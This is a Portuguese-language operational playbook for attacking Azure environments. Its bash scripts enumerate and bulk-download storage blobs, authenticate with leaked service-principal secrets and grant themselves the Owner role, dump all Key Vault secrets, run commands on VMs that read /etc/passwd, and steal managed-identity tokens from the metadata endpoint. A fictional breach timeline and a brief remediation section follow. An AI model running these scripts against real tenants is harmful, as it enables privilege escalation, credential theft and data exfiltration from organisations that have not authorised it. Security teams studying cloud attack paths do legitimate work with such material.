# Azure Exploitation - Guia Completo de Exploração Operacional

---

## 3.1 STORAGE ACCOUNT EXPLOITATION

### 🎯 Vulnerabilidade
```
Tipo: Misconfiguration + Credential Exposure
CVSS: 9.1
Cenários:
  1. Storage account keys expostas (ex: app.config, GitHub)
  2. Public blob containers (sem autenticação)
  3. SAS tokens com permissões amplas
```

### 📋 EXPLORAÇÃO PASSO-A-PASSO

#### FASE 1: ENUMERAR STORAGE ACCOUNTS
```bash
#!/bin/bash
# Script: azure-storage-enum.sh

echo "[*] Fase 1: Enumeração de Storage Accounts"

# Listar storage accounts
az storage account list --query '[*].[name,primaryEndpoints.blob]' -o table

# Se tiver acesso
STORAGE_ACCOUNT="acmestoragedev"
STORAGE_KEY=$(az storage account keys list -n $STORAGE_ACCOUNT --query '[0].value' -o tsv)

# Testar acesso
az storage container list --account-name $STORAGE_ACCOUNT \
  --account-key $STORAGE_KEY --query '[*].name' -o table
```

#### FASE 2: BUSCAR DADOS SENSÍVEIS
```bash
#!/bin/bash
# Script: azure-find-sensitive.sh

ACCOUNT="acmestoragedev"
ACCOUNT_KEY="$STORAGE_KEY"

echo "[*] Fase 2: Busca de Dados Sensíveis"

# Listar todos os containers
az storage container list --account-name $ACCOUNT --account-key $ACCOUNT_KEY -o table

# Procurar por padrões em nomes
az storage blob list -c backups -a $ACCOUNT --account-key $ACCOUNT_KEY \
  --query '[*].[name, properties.contentLength]' -o table

# Encontrados típicos
echo "[!] Procurando:"
echo "    - *.bak, *.sql, *.zip"
echo "    - *backup*, *archive*"
echo "    - *database*, *secret*, *config*"
```

#### FASE 3: DOWNLOAD DE DADOS
```bash
#!/bin/bash
# Script: azure-exfil.sh

ACCOUNT="acmestoragedev"
ACCOUNT_KEY="$STORAGE_KEY"
CONTAINER="backups"
OUTPUT_DIR="./azure-data"
mkdir -p "$OUTPUT_DIR"

echo "[*] Fase 3: Exfiltração de Dados"

# Listar blobs
az storage blob list -c $CONTAINER -a $ACCOUNT --account-key $ACCOUNT_KEY \
  --query '[*].name' -o tsv | while read blob; do
  
  # Verificar tamanho
  SIZE=$(az storage blob show -c $CONTAINER -n "$blob" -a $ACCOUNT \
    --account-key $ACCOUNT_KEY --query 'properties.contentLength' -o tsv)
  
  echo "[?] Baixando: $blob ($SIZE bytes)"
  
  # Download
  az storage blob download -c $CONTAINER -n "$blob" -a $ACCOUNT \
    --account-key $ACCOUNT_KEY \
    --file "$OUTPUT_DIR/$blob" \
    --no-progress
done

echo "[+] Total de arquivos: $(find $OUTPUT_DIR -type f | wc -l)"
```

---

## 3.2 SERVICE PRINCIPAL COMPROMISE

### 🎯 Vulnerabilidade
```
Tipo: Credential Exposure
CVSS: 10.0
Cenários:
  1. Client secret em app.config/appsettings.json
  2. Service principal key em GitHub
  3. Permissões excessivas atribuídas
```

### 📋 EXPLORAÇÃO

#### FASE 1: DESCOBRIR SERVICE PRINCIPALS
```bash
#!/bin/bash
# Script: azure-sp-enum.sh

echo "[*] Fase 1: Enumeração de Service Principals"

# Se você tiver credenciais de SP
SP_CLIENT_ID="your-client-id"
SP_CLIENT_SECRET="your-client-secret"
TENANT_ID="your-tenant-id"

echo "[?] Autenticando como Service Principal..."
az login --service-principal \
  -u $SP_CLIENT_ID \
  -p $SP_CLIENT_SECRET \
  --tenant $TENANT_ID

echo "[?] Obtendo identidade..."
az account show

echo "[?] Enumerando permissões..."
az role assignment list --assignee $SP_CLIENT_ID \
  --query '[*].[principalName, roleDefinitionName, scope]' -o table
```

#### FASE 2: ESCALAR PRIVILÉGIOS
```bash
#!/bin/bash
# Script: azure-sp-escalate.sh

echo "[*] Fase 2: Escalar Privilégios de SP"

SUBSCRIPTION_ID=$(az account show --query id -o tsv)
SP_OBJECT_ID="object-id-of-sp"

# Adicionar role Owner
echo "[?] Atribuindo role Owner..."
az role assignment create \
  --role Owner \
  --assignee $SP_OBJECT_ID \
  --scope /subscriptions/$SUBSCRIPTION_ID

echo "[+] Service Principal agora é Owner da subscription!"
echo "[+] Próximas ações:"
echo "    1. Criar novo Service Principal backdoor"
echo "    2. Acessar Key Vaults"
echo "    3. Exfiltrar dados"
```

---

## 3.3 KEYVAULT EXPLOITATION

### 📋 EXPLORAÇÃO

```bash
#!/bin/bash
# Script: azure-keyvault-enum.sh

echo "[*] Enumerando KeyVaults"

# Listar vaults
az keyvault list --query '[*].[name, location]' -o table

# Listar secrets em vault
VAULT_NAME="acme-prod-vault"

echo "[?] Listando secrets em $VAULT_NAME..."
az keyvault secret list --vault-name $VAULT_NAME \
  --query '[*].name' -o table

# Recuperar cada secret
az keyvault secret list --vault-name $VAULT_NAME --query '[*].name' -o tsv | while read secret; do
  VALUE=$(az keyvault secret show --vault-name $VAULT_NAME --name "$secret" --query value -o tsv)
  echo "[!] $secret = $VALUE"
done

# Se tiver database connection string
DB_CONN=$(az keyvault secret show --vault-name $VAULT_NAME \
  --name "db-connection-string" --query value -o tsv)

echo "[+] Connection string obtida: $DB_CONN"
```

---

## 3.4 AZURE AD USER ENUMERATION & COMPROMISE

### 📋 EXPLORAÇÃO

```bash
#!/bin/bash
# Script: azure-ad-enum.sh

echo "[*] Enumerando Azure AD"

# Listar usuários
az ad user list --query '[*].[userPrincipalName, displayName]' -o table

# Listar grupos
az ad group list --query '[*].[displayName, description]' -o table

# Procurar grupo "admins"
az ad group member list --group "Admin Group" \
  --query '[*].[displayName, userPrincipalName]' -o table

# Se conseguir credenciais de admin, conseguir MFA bypass
# (requer técnicas avançadas)
```

---

## 3.5 VIRTUAL MACHINE COMPROMISE

### 📋 EXPLORAÇÃO

```bash
#!/bin/bash
# Script: azure-vm-exploit.sh

echo "[*] Enumerando VMs"

RESOURCE_GROUP="production"
VM_NAME="prod-vm-01"

# Listar VMs
az vm list -d --query '[*].[name, powerState, publicIps]' -o table

# Acessar VM
echo "[?] Conectando via SSH..."
az vm user update -d ubuntu -n $VM_NAME -g $RESOURCE_GROUP

# SSH
ssh ubuntu@public-ip

# Ou usar Run Command
echo "[?] Executando comando remoto..."
az vm run-command invoke \
  --resource-group $RESOURCE_GROUP \
  --name $VM_NAME \
  --command-id RunShellScript \
  --scripts 'whoami; id; cat /etc/passwd'

# Recuperar managed identity token
echo "[?] Recuperando token de Managed Identity..."
curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/' \
  -H 'Metadata: true' | jq .

# Usar token para acessar recursos Azure
TOKEN=$(curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/' \
  -H 'Metadata: true' | jq -r '.access_token')

# Listar VMs com token
curl -s -H "Authorization: Bearer $TOKEN" \
  https://management.azure.com/subscriptions/SUB_ID/resourceGroups/RG/providers/Microsoft.Compute/virtualMachines?api-version=2021-03-01
```

---

## 📝 CASE STUDY: Acme Corp Azure Breach

**TIMELINE:**

| Tempo | Fase | Encontrado | Status |
|---|---|---|---|
| 00:00-00:05 | Recon | Client secret em app.config público | ✅ CRÍTICO |
| 00:05-00:20 | Auth | Service Principal autenticado | ✅ Access OK |
| 00:20-00:40 | Enum | Permissões: Editor (!) | ✅ Escalação possível |
| 00:40-01:00 | Escalate | Atribuindo role Owner | ✅ Agora sou Owner |
| 01:00-01:30 | Discovery | 15 Key Vaults encontrados | ✅ Secrets expostos |
| 01:30-02:00 | Extract | 250+ secrets extraídos | ✅ API keys, DB password |
| 02:00-02:30 | Database | Conectado ao SQL Database | ✅ 500K registros |

**DADOS ENCONTRADOS:**
```
- Service Principal: AppID xxxxx, Secret: Xxxxxx
- Storage Account Key: DefaultEndpointsProtocol=https;...
- Database Connection String: Server=acme.database.windows.net;...
- 250+ Application Secrets
- 45 API Keys (GitHub, SendGrid, Twilio)
```

---

## 🛑 DETECÇÃO & MITIGAÇÃO

**Activity Log Indicators:**
```json
{
  "eventName": "List Secrets",
  "caller": "ServicePrincipal_xxxxx",
  "resourceProvider": "Microsoft.KeyVault",
  "status": "Success",
  "timestamp": "2024-01-15T14:30:00Z"
}
```

**REMEDIAÇÃO:**
```bash
#!/bin/bash
# Script: azure-remediate.sh

VAULT_NAME="acme-prod-vault"

echo "[*] Iniciando remediação Azure"

# 1. Rotacionar secrets
echo "[1] Rotacionando secrets do Key Vault..."
az keyvault secret set --vault-name $VAULT_NAME \
  --name "db-password" \
  --value "NewComplexPassword123!@#"

# 2. Revogar acesso de SP comprometido
echo "[2] Revogando SP comprometido..."
az ad app credential delete \
  --id app-object-id \
  --key-id credential-id

# 3. Criar novo SP
echo "[3] Criando novo Service Principal..."
az ad sp create-for-rbac --name "prod-app-new"

# 4. Ativar logging
echo "[4] Ativando Key Vault logging..."
az monitor diagnostic-settings create \
  --name kvdiags \
  --resource /subscriptions/SUB/resourcegroups/RG/providers/microsoft.keyvault/vaults/$VAULT_NAME \
  --logs '[{"category":"AuditEvent","enabled":true}]' \
  --storage-account /subscriptions/SUB/resourcegroups/RG/providers/microsoft.storage/storageaccounts/logstg
```

---

## 🛠️ TOOLS NECESSÁRIAS

```bash
# Instalação Azure CLI
pip install azure-cli

# Login
az login

# Verificar acesso
az account show
az account list
```

